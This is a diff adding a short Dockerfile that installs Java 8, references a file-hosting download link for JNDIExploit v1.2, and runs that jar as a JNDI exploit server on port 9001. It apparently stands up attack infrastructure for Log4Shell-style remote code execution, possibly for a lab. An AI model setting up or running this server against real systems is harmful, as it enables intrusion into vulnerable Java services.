@@ -1,0 +1,10 @@
+#docker build . -t ubuntu:jndi
+from ubuntu:latest
+
+RUN apt-get update -y && apt-get install -y openjdk-8-jre wget zip
+
+# https://download1320.mediafire.com/8nkrfr49l20g/dm0qgwujkwcy585/JNDIExploit.v1.2.zip
+
+COPY ./JNDIExploit/JNDIExploit-1.2-SNAPSHOT.jar /
+
+CMD ["java", "-jar", "./JNDIExploit-1.2-SNAPSHOT.jar", "-i", "jndi", "-p", "9001"]
